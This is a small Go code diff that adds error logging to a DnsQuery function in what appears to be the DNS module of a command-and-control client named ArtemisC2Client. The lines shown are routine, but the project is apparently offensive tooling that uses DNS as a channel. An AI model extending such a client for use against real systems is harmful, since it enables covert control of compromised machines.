@@ -2,6 +2,7 @@ package dns
 
 import (
 	"fmt"
+	"github.com/desertcod98/ArtemisC2Client/log"
 
 	"github.com/miekg/dns"
 )
@@ -22,6 +23,7 @@ func DnsQuery(subdomain string) (string, error) {
 
 	r, _, err := client.Exchange(&m, dnsServer)
 	if err != nil {
+		log.Log(err.Error())
 		return "", err
 	}
 
